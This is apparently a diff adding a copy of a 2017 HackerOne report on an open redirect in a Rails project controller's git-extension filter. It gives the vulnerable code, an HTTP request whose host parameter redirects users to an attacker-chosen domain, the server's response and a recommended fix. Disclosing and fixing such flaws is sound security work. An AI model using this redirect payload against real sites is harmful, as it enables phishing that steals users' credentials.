@@ -1,0 +1,83 @@
+From HackerOne:
+
+Title:         Pervasive Open Redirect Affecting Project Pages
+
+Scope:         None
+
+Weakness:      Open Redirect
+
+Severity:      Medium (4.3)
+
+Link:          https://hackerone.com/reports/267401
+
+Date:          2017-09-11 01:11:57 +0000
+
+By:            @ericr
+
+Details:
+## Summary
+
+The Project Application controller defines a before_action filter named "redirect_git_extension". This filter attempts to detect and remove the git extension that may appear in a project request's URI. In order to do this, it calls the Ruby on Rails `redirect_to` method with the original request's params object.
+
+**/app/controllers/projects/application_controller.rb:**
+```
+4:   skip_before_action :authenticate_user!
+5:   before_action :redirect_git_extension
+[...]
+14   def redirect_git_extension
+15     # Redirect from
+16     #   localhost/group/project.git
+17     # to
+18     #   localhost/group/project
+19     #
+20     redirect_to url_for(params.merge(format: nil)) if params[:format] == 'git'
+21   end
+```
+
+Due to the requester having control over the params object, the `redirect_to` method can be called with arbitrary options. For a list of accepted options in the latest version of Ruby on Rails, please see:
+
+http://api.rubyonrails.org/classes/ActionController/Redirecting.html
+
+## Impact
+
+An attacker can supply options such as `host` and `protocol` to change the target of the redirect, thereby redirecting a user to an arbitrary domain.
+
+There are many controllers that inherit from the Project Application controller. All actions of these controllers are potentially vulnerable due to the affected before_action filter being called. Some affected controller actions also do not require authentication, such as the Project controller's index action.
+
+An attacker can exploit an open redirect vulnerability in a phishing attack to trick users into trusting a malicious third-party webpage. This is because users who click on a link may not notice a redirect taking place, especially if the two domains look similar. As a result, a victim may unknowingly enter their login credentials on an attacker-controlled webpage.
+
+## Reproduction
+
+The following reproduction demonstrates an unauthenticated user hitting the Project controller's index action and getting redirected to an attacker-supplied domain (in this case example.com):
+
+**HTTP Request:**
+```
+GET /projects.git?host=example.com HTTP/1.1
+Host: 138.197.67.108
+```
+
+**HTTP Response:**
+```
+HTTP/1.1 302 Found
+Server: nginx
+Date: Mon, 11 Sep 2017 00:02:09 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 93
+Connection: keep-alive
+Cache-Control: no-cache
+Location: http://example.com/projects
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-Request-Id: 94a18532-dc37-4d6d-b124-f752b809ff57
+X-Runtime: 0.009936
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+Strict-Transport-Security: max-age=31536000
+
+<html><body>You are being <a href="http://example.com/projects">redirected</a>.</body></html>
+```
+
+## Recommended Fix
+Rather than invoking the `url_for` method with a user-controllable params object, it is recommended that a modified version of the requested URI string be redirected to instead. By properly parsing the requested URI string of its extension, a version without the git extension can then be securely redirected to.
+
+Timeline:
